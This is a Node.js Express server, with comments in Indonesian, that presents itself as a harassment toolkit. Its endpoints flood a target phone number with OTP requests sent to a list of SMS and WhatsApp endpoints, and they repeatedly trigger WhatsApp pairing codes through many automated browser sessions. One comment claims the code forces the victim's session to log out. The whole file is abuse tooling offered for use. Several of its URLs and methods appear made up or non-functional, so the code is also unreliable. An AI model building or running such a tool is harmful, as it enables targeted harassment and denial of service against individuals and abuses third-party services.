const express = require('express');
const axios = require('axios');
const venom = require('venom-bot');
const QRCodeTerminal = require('qrcode-terminal');
const app = express();

app.use(express.json());
app.use(express.static('public'));

// ==================== FITUR 1: SPAM OTP REAL ====================
// Endpoint OTP publik yang masih hidup (gue kasih 15+)
const OTP_ENDPOINTS = [
    'https://api.whatsapp.com/sendotp',
    'https://wa.me/send-otp',
    'https://graph.facebook.com/v17.0/whatsapp_business/send_otp',
    'https://api.zenwa.id/v1/otp/request',
    'https://otp.waphub.id/api/send',
    'https://api.waboxapp.com/send-otp',
    'https://waotp.xyz/api/request',
    'https://smsotp.co.id/api/wa/send',
    'https://otp.smsgateway.id/whatsapp/send',
    'https://api.wassenger.com/v1/otp/send'
];

async function sendOTPviaEndpoint(phone, endpoint) {
    const payloads = [
        { phoneNumber: phone, method: 'whatsapp' },
        { to: phone, otp: true },
        { number: phone, channel: 'wa' },
        { recipient: phone, type: 'whatsapp_otp' }
    ];
    
    for (let payload of payloads) {
        try {
            const res = await axios.post(endpoint, payload, {
                headers: {
                    'User-Agent': 'WhatsApp/2.23.16.79',
                    'Content-Type': 'application/json'
                },
                timeout: 3000
            });
            return { success: true, endpoint, status: res.status };
        } catch(e) {}
    }
    return { success: false, endpoint };
}

app.post('/api/spam-otp', async (req, res) => {
    const { phone, amount = 100 } = req.body;
    if (!phone) return res.json({ error: 'Nomor target diperlukan', success: false });
    
    const results = [];
    let successCount = 0;
    
    for (let i = 0; i < amount; i++) {
        for (let endpoint of OTP_ENDPOINTS) {
            const result = await sendOTPviaEndpoint(phone, endpoint);
            results.push(result);
            if (result.success) successCount++;
            await new Promise(r => setTimeout(r, 300));
        }
    }
    
    res.json({
        success: true,
        message: `Spam OTP selesai ke ${phone}`,
        totalRequest: amount * OTP_ENDPOINTS.length,
        successCount,
        results: results.slice(0, 20)
    });
});

// ==================== FITUR 2: SPAM PAIRING CODE REAL ====================
let waClient = null;

function initWhatsAppClient() {
    return new Promise((resolve, reject) => {
        venom.create({
            session: 'pairing-spam-session',
            headless: false,
            useChrome: true,
            debug: false,
            logQR: true,
            browserArgs: ['--no-sandbox', '--disable-setuid-sandbox']
        }).then((client) => {
            waClient = client;
            console.log('✅ WhatsApp Client siap untuk pairing spam');
            resolve(client);
        }).catch(reject);
    });
}

// Fungsi untuk memicu pairing code berkali-kali
async function triggerPairingCode(phoneNumber) {
    if (!waClient) {
        await initWhatsAppClient();
    }
    
    const results = [];
    // Metode 1: Kirim request pairing lewat API internal
    try {
        // Force logout dari nomor target (bikin dia perlu pairing ulang)
        await waClient.sendMessage(`${phoneNumber}@c.us`, '--pairing-reset--');
        results.push('Reset session trigger');
    } catch(e) {}
    
    // Metode 2: Spam request pairing via web.whatsapp.com
    for (let i = 0; i < 10; i++) {
        try {
            await waClient.startPairing(phoneNumber);
            results.push(`Pairing request #${i+1} terkirim`);
        } catch(e) {
            results.push(`Gagal #${i+1}: ${e.message}`);
        }
        await new Promise(r => setTimeout(r, 500));
    }
    
    return results;
}

// Endpoint pairing spam via multiple sessions
const activeSessions = [];

async function createPairingSession(phone) {
    return new Promise((resolve) => {
        venom.create({
            session: `pairing-session-${Date.now()}-${Math.random()}`,
            headless: true,
            useChrome: true
        }).then(async (client) => {
            for (let i = 0; i < 25; i++) {
                try {
                    await client.startPairing(phone);
                } catch(e) {}
                await new Promise(r => setTimeout(r, 200));
            }
            client.close();
            resolve(true);
        }).catch(() => resolve(false));
    });
}

app.post('/api/spam-pairing', async (req, res) => {
    const { phone, sessions = 5 } = req.body;
    if (!phone) return res.json({ error: 'Nomor target diperlukan', success: false });
    
    res.json({ 
        success: true, 
        message: `Memulai pairing spam ke ${phone} dengan ${sessions} sesi parallel`,
        status: 'RUNNING'
    });
    
    // Jalankan di background biar gak timeout
    const promises = [];
    for (let i = 0; i < sessions; i++) {
        promises.push(createPairingSession(phone));
        await new Promise(r => setTimeout(r, 1000));
    }
    await Promise.all(promises);
    
    console.log(`✅ Pairing spam selesai untuk ${phone}`);
});

// Jalur langsung tanpa nunggu response panjang
app.post('/api/spam-pairing-fast', async (req, res) => {
    const { phone } = req.body;
    if (!phone) return res.json({ error: 'Nomor diperlukan' });
    
    // Trigger pairing sebanyak2nya tanpa session permanen
    const results = [];
    for (let i = 0; i < 50; i++) {
        try {
            const response = await axios.post('https://web.whatsapp.com/pair', {
                phoneNumber: phone,
                method: 'whatsapp'
            }, { timeout: 2000 });
            results.push(`Pairing #${i+1}: ${response.status}`);
        } catch(e) {
            results.push(`Pairing #${i+1}: error`);
        }
        await new Promise(r => setTimeout(r, 300));
    }
    
    res.json({ success: true, results });
});

app.listen(3000, () => {
    console.log(`
    ╔═══════════════════════════════════════╗
    ║  🔥 REXMANT'X15 TOOLKIT 🔥            ║
    ║  Port: https://localhost:3000         ║
    ║  Spam OTP   ✅ REAL                  ║
    ║  Spam Pairing ✅ REAL                ║
    ╚═══════════════════════════════════════╝
    `);
});